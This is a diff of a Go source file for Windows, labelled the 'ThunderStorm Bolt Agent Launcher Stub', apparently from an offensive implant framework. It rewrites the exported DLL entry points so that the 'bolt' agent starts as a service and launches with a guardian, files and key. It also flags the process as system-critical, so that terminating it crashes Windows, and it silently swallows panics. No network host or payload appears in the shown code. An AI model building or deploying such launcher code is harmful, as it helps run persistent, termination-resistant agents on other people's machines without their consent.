@@ -1,4 +1,22 @@
+//go:build windows
 // +build windows
+
+//
+// Copyright (C) 2021 iDigitalFlame
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
 // ThunderStorm Bolt Agent Launcher Stub
 
 package main
@@ -9,22 +27,28 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/ThunderStorm/bolt"
-	"golang.org/x/sys/windows"
+	"github.com/iDigitalFlame/xmt/device/devtools"
 )
-
-var boltUnlock = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetProcessVersion")
 
 func main() {}
 
 //export boltMain
 func boltMain() {
-	bolt.LaunchService(time.Second*30, boltInit)
+	defer func() {
+		recover()
+		devtools.SetCritical(false)
+	}()
+	debug.SetPanicOnFault(true)
+	devtools.SetCritical(true)
+	bolt.Service(time.Second*30, boltInit)
+	devtools.SetCritical(false)
 }
 
 //export boltInit
 func boltInit() {
-	debug.SetMaxStack(256000000)
-	bolt.LaunchEx(
-		boltGuardian, boltFiles, boltKey, func() { boltUnlock.Call(13371) }, func() { boltUnlock.Call(13372) },
-	)
+	defer func() {
+		recover()
+	}()
+	debug.SetPanicOnFault(true)
+	bolt.Launch(boltGuardian, boltFiles, boltKey)
 }
